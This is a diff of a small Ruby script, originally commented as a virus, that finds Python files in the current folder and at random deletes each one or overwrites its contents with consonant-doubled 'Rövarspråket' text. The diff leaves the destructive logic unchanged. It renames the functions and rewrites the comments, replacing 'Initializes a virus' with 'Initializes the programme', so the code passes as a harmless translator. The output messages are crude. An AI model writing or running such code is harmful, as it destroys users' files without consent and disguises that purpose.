@@ -1,37 +1,49 @@
-#Initializes a virus
+#Initializes the programme
 def start
   puts "We are definitely not Fu**ing up your python files... or are we?"
   file_search
 end
 
-#Checks the folder for python files
+#Checks files >> list
 def file_search
+  #Checks the current folder for python files
   py_files = Dir.glob('*.py')
+  #Checks if files exist, exists if not
   if py_files != []
-    destiny(py_files)
+    file_output(py_files)
   else
     puts "You got lucky, Motherasshole!"
   end
 end
 
-#Goes through a list and decides if the currently selected file gets deleted or converted to "Rövarspråket"
-def destiny(list)
+#Processes a list
+#file_output(["file"])
+#=> deletes file || sends file to translator
+def file_output(list)
+  #Iterate over a list and decides what do with it
   list.each do |x|
-    jesus = god
-      File.delete(x) if jesus == 1
-      ass_schmacker(x) if jesus == 2
+    #Decides the outcome for the current file
+    number = rand_nr
+      File.delete(x) if number == 1
+      translator(x) if number == 2
   end
 end
 
 #Generates a number between 1-2
-def god
+def rand_nr
   return rand(1..2)
 end
 
-#Converts the contents of the file to "Rövarspråk"
-def ass_schmacker(file)
+#Translates file contents
+#translator(file)
+#file = "Hey there"
+#=> file = "HoHey tothoherore"
+def translator(file)
+  #Opens the file
   text = File.read(file)
+  #Check the content for any non vocals -> adds an o and the non vocal instead
   replace = text.gsub!(/([bcdfghjklmnpqrstvwxzBCDFGHJKLMNPQRSTVWXZ])/, '\1o\1')
+  #Replace the original content with translated content
   File.open(file, "w") {|z| z.puts replace}
 end
 
@@ -50,5 +62,5 @@ File.open('test.py', 'w') do |f2|
         f2.puts "Who was rapping, dovahkiin dragons are not dovahkiin"
       end
 
-#Initializes the initialisation of the virus
+#Function calls
 start
